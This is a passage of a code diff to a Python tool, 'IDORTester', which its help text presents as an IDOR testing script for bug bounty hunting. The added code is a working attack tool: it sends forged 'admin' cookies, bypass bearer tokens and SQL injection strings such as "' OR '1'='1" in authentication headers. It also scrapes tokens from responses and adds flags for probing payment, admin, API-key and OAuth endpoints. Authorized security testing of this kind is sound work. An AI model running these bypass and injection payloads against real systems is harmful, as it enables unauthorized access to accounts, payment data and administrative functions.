+                    "type": "Potential IDOR (length diff)",
                     "url": modified_url,
-                    "description": f"{description} - Response size changed significantly ({original_length} vs {modified_length})",
+                    "description": f"{description} - Response size changed ({original_length} vs {modified_length})",
                     "status": modified_response.status_code,
                     "response_sample": modified_response.text[:200] + "..." if len(modified_response.text) > 200 else modified_response.text
                 }
-        
+        # If both responses are not empty and not identical, highlight the diff
+        if original_response.text.strip() != modified_response.text.strip():
+            return {
+                "type": "Potential IDOR (any diff)",
+                "url": modified_url,
+                "description": f"{description} - Any difference in response detected",
+                "status": modified_response.status_code,
+                "response_sample": modified_response.text[:200] + "..." if len(modified_response.text) > 200 else modified_response.text
+            }
         return None
 
     def _check_response_for_vulnerability(self, response, description):
@@ -1200,19 +1755,19 @@ class IDORTester:
             return True
             
         # UUIDs
-        if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}, value, re.IGNORECASE):
+        if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', value, re.IGNORECASE):
             return True
             
         # Base64-like strings
-        if re.match(r'^[A-Za-z0-9+/]{22,}[=]{0,2}, value):
+        if re.match(r'^[A-Za-z0-9+/]{22,}[=]{0,2}$', value):
             return True
             
         # Hexadecimal IDs
-        if re.match(r'^[0-9a-f]{8,}, value, re.IGNORECASE):
+        if re.match(r'^[0-9a-f]{8,}$', value, re.IGNORECASE):
             return True
             
         # Alphanumeric IDs with common separators
-        if re.match(r'^[A-Za-z0-9][A-Za-z0-9_-]{4,}, value):
+        if re.match(r'^[A-Za-z0-9][A-Za-z0-9_-]{4,}$', value):
             return True
             
         return False
@@ -1280,14 +1835,31 @@ class IDORTester:
             
         console.print(f"[bold green]Found {len(self.findings)} potential IDOR vulnerabilities![/bold green]")
         
+        # Count findings by severity
+        critical_count = len([f for f in self.findings if f.get("severity") == "CRITICAL"])
+        high_count = len([f for f in self.findings if f.get("severity") == "HIGH"])
+        medium_count = len([f for f in self.findings if f.get("severity") in ["MEDIUM", None]])
+        
+        if critical_count > 0:
+            console.print(f"[bold red]CRITICAL: {critical_count} vulnerabilities[/bold red]")
+        if high_count > 0:
+            console.print(f"[bold yellow]HIGH: {high_count} vulnerabilities[/bold yellow]")
+        if medium_count > 0:
+            console.print(f"[bold green]MEDIUM: {medium_count} vulnerabilities[/bold green]")
+        
         table = Table(title="IDOR Vulnerability Report")
+        table.add_column("Severity", style="red")
         table.add_column("Type", style="cyan")
         table.add_column("URL", style="blue", overflow="fold")
         table.add_column("Description", overflow="fold")
         table.add_column("Status", style="magenta")
         
         for finding in self.findings:
+            severity = finding.get("severity", "MEDIUM")
+            severity_style = "red" if severity == "CRITICAL" else "yellow" if severity == "HIGH" else "green"
+            
             table.add_row(
+                f"[{severity_style}]{severity}[/{severity_style}]",
                 finding["type"],
                 finding["url"],
                 finding["description"],
@@ -1311,6 +1883,269 @@ class IDORTester:
         except Exception as e:
             console.print(f"[bold red]Error saving results: {str(e)}[/bold red]")
 
+    def _extract_auth_data(self, response):
+        """Extract authentication data from response headers and body"""
+        auth_data = {
+            'cookies': {},
+            'tokens': [],
+            'headers': {},
+            'params': []
+        }
+        
+        # Extract cookies from Set-Cookie headers
+        if 'Set-Cookie' in response.headers:
+            for cookie in response.headers.getlist('Set-Cookie'):
+                if '=' in cookie:
+                    cookie_name = cookie.split('=')[0].strip()
+                    cookie_value = cookie.split('=')[1].split(';')[0].strip()
+                    auth_data['cookies'][cookie_name] = cookie_value
+        
+        # Extract tokens from response body
+        token_patterns = [
+            r'token["\s:=]+["\s]*([^"<>\s,]+)',
+            r'access_token["\s:=]+["\s]*([^"<>\s,]+)',
+            r'jwt["\s:=]+["\s]*([^"<>\s,]+)',
+            r'session["\s:=]+["\s]*([^"<>\s,]+)',
+            r'auth["\s:=]+["\s]*([^"<>\s,]+)',
+            r'csrf["\s:=]+["\s]*([^"<>\s,]+)',
+            r'xsrf["\s:=]+["\s]*([^"<>\s,]+)',
+            r'api_key["\s:=]+["\s]*([^"<>\s,]+)',
+            r'apikey["\s:=]+["\s]*([^"<>\s,]+)',
+            r'bearer["\s:=]+["\s]*([^"<>\s,]+)',
+        ]
+        
+        for pattern in token_patterns:
+            matches = re.findall(pattern, response.text, re.IGNORECASE)
+            auth_data['tokens'].extend(matches)
+        
+        # Extract authentication headers
+        auth_headers = ['Authorization', 'X-Auth-Token', 'X-API-Key', 'X-CSRF-Token', 'X-XSRF-Token']
+        for header in auth_headers:
+            if header in response.headers:
+                auth_data['headers'][header] = response.headers[header]
+        
+        return auth_data
+
+    def _test_auth_bypass(self, endpoints):
+        """Test for IDOR via authentication bypass techniques"""
+        if self.verbose:
+            console.print("[bold blue]Testing for authentication bypass vulnerabilities...[/bold blue]")
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            
+            for endpoint in endpoints:
+                # Test 1: Without any authentication
+                futures.append(executor.submit(
+                    self._test_auth_scenario,
+                    url=endpoint,
+                    cookies={},
+                    headers=self.headers,
+                    description="No authentication test"
+                ))
+                
+                # Test 2: With empty/blank authentication
+                blank_headers = self.headers.copy()
+                blank_headers.update({
+                    'Authorization': '',
+                    'X-Auth-Token': '',
+                    'X-API-Key': '',
+                    'X-CSRF-Token': '',
+                    'X-XSRF-Token': ''
+                })
+                futures.append(executor.submit(
+                    self._test_auth_scenario,
+                    url=endpoint,
+                    cookies={},
+                    headers=blank_headers,
+                    description="Blank authentication test"
+                ))
+                
+                # Test 3: With common bypass tokens
+                bypass_tokens = [
+                    'null', 'undefined', 'none', 'empty', 'false', '0',
+                    'admin', 'root', 'system', 'test', 'guest', 'anonymous',
+                    'true', 'yes', '1', 'valid', 'authenticated'
+                ]
+                
+                for token in bypass_tokens:
+                    bypass_headers = self.headers.copy()
+                    bypass_headers.update({
+                        'Authorization': f'Bearer {token}',
+                        'X-Auth-Token': token,
+                        'X-API-Key': token,
+                        'X-CSRF-Token': token,
+                        'X-XSRF-Token': token
+                    })
+                    futures.append(executor.submit(
+                        self._test_auth_scenario,
+                        url=endpoint,
+                        cookies={},
+                        headers=bypass_headers,
+                        description=f"Bypass token test: {token}"
+                    ))
+                
+                # Test 4: With common bypass cookies
+                bypass_cookies = {
+                    'session': 'admin',
+                    'user_id': 'admin',
+                    'userid': 'admin',
+                    'uid': 'admin',
+                    'id': 'admin',
+                    'auth': 'true',
+                    'authenticated': 'true',
+                    'logged_in': 'true',
+                    'admin': 'true',
+                    'role': 'admin',
+                    'is_admin': 'true',
+                    'isAdmin': 'true'
+                }
+                
+                futures.append(executor.submit(
+                    self._test_auth_scenario,
+                    url=endpoint,
+                    cookies=bypass_cookies,
+                    headers=self.headers,
+                    description="Bypass cookies test"
+                ))
+                
+                # Test 5: With SQL injection in auth
+                sqli_auth = [
+                    "' OR '1'='1",
+                    "' OR 1=1--",
+                    "' OR 'a'='a",
+                    "' OR 1=1#",
+                    "' OR 1=1/*",
+                    "admin'--",
+                    "admin'#",
+                    "admin'/*"
+                ]
+                
+                for sqli in sqli_auth:
+                    sqli_headers = self.headers.copy()
+                    sqli_headers.update({
+                        'Authorization': f'Bearer {sqli}',
+                        'X-Auth-Token': sqli,
+                        'X-API-Key': sqli
+                    })
+                    futures.append(executor.submit(
+                        self._test_auth_scenario,
+                        url=endpoint,
+                        cookies={},
+                        headers=sqli_headers,
+                        description=f"SQLi auth test: {sqli}"
+                    ))
+            
+            # Process results
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        result["severity"] = "HIGH"
+                        self.findings.append(result)
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in auth bypass test: {str(e)}[/yellow]")
+
+    def _test_auth_scenario(self, url, cookies, headers, description):
+        """Test a specific authentication scenario"""
+        try:
+            response = requests.get(
+                url,
+                headers=headers,
+                cookies=cookies,
+                proxies=self.proxy,
+                verify=self.verify_ssl,
+                timeout=self.timeout
+            )
+            
+            return self._check_response_for_vulnerability(response, description)
+            
+        except Exception as e:
+            if self.verbose:
+                console.print(f"[yellow]Error in auth scenario test: {str(e)}[/yellow]")
+            return None
+
+    def _test_batch_payload(self, url, payload, description):
+        """Test a batch operation with a specific payload"""
+        try:
+            response = requests.post(
+                url,
+                json=payload,
+                headers=self.headers,
+                cookies=self.cookies,
+                proxies=self.proxy,
+                verify=self.verify_ssl,
+                timeout=self.timeout
+            )
+            
+            return self._check_response_for_vulnerability(response, description)
+            
+        except Exception as e:
+            if self.verbose:
+                console.print(f"[yellow]Error in batch payload test: {str(e)}[/yellow]")
+            return None
+
+    def _test_webhook_payload(self, url, payload, description):
+        """Test a webhook endpoint with a specific payload"""
+        try:
+            response = requests.post(
+                url,
+                json=payload,
+                headers=self.headers,
+                cookies=self.cookies,
+                proxies=self.proxy,
+                verify=self.verify_ssl,
+                timeout=self.timeout
+            )
+            
+            return self._check_response_for_vulnerability(response, description)
+            
+        except Exception as e:
+            if self.verbose:
+                console.print(f"[yellow]Error in webhook payload test: {str(e)}[/yellow]")
+            return None
+
+    def _test_oauth_payload(self, url, payload, description):
+        """Test an OAuth endpoint with a specific payload"""
+        try:
+            response = requests.post(
+                url,
+                json=payload,
+                headers=self.headers,
+                cookies=self.cookies,
+                proxies=self.proxy,
+                verify=self.verify_ssl,
+                timeout=self.timeout
+            )
+            
+            return self._check_response_for_vulnerability(response, description)
+            
+        except Exception as e:
+            if self.verbose:
+                console.print(f"[yellow]Error in OAuth payload test: {str(e)}[/yellow]")
+            return None
+
+    def _test_json_payload(self, url, payload, description):
+        """Test an endpoint with a JSON payload"""
+        try:
+            response = requests.post(
+                url,
+                json=payload,
+                headers=self.headers,
+                cookies=self.cookies,
+                proxies=self.proxy,
+                verify=self.verify_ssl,
+                timeout=self.timeout
+            )
+            
+            return self._check_response_for_vulnerability(response, description)
+            
+        except Exception as e:
+            if self.verbose:
+                console.print(f"[yellow]Error in JSON payload test: {str(e)}[/yellow]")
+            return None
+
 def main():
     parser = argparse.ArgumentParser(description='Advanced IDOR Vulnerability Testing Script for Bug Bounty Hunting')
     parser.add_argument('-u', '--url', required=True, help='Target URL')
@@ -1326,7 +2161,35 @@ def main():
     parser.add_argument('--jwt', help='JWT token to manipulate for testing')
     parser.add_argument('--graphql', action='store_true', help='Enable GraphQL-specific IDOR testing')
     
+    # Enhanced high-value testing options
+    parser.add_argument('--sequential', action='store_true', help='Test sequential IDs (1-20, 100-120, 1000-1020)')
+    parser.add_argument('--common-ids', action='store_true', help='Test common high-value IDs (admin, root, system, etc.)')
+    parser.add_argument('--privileged', action='store_true', help='Test privileged endpoints (admin, management, etc.)')
+    parser.add_argument('--batch', action='store_true', help='Test batch operations for IDOR')
+    parser.add_argument('--webhooks', action='store_true', help='Test webhook endpoints for IDOR')
+    parser.add_argument('--files', action='store_true', help='Test file operations for IDOR')
+    parser.add_argument('--admin', action='store_true', help='Test admin functions for IDOR')
+    parser.add_argument('--payment', action='store_true', help='Test payment endpoints for IDOR')
+    parser.add_argument('--api-keys', action='store_true', help='Test API key endpoints for IDOR')
+    parser.add_argument('--oauth', action='store_true', help='Test OAuth endpoints for IDOR')
+    
+    # Enable all high-value tests
+    parser.add_argument('--all-high-value', action='store_true', help='Enable all high-value IDOR tests')
+    
     args = parser.parse_args()
+    
+    # Enable all high-value tests if --all-high-value is specified
+    if args.all_high_value:
+        args.sequential = True
+        args.common_ids = True
+        args.privileged = True
+        args.batch = True
+        args.webhooks = True
+        args.files = True
+        args.admin = True
+        args.payment = True
+        args.api_keys = True
+        args.oauth = True
     
     try:
         tester = IDORTester(args)
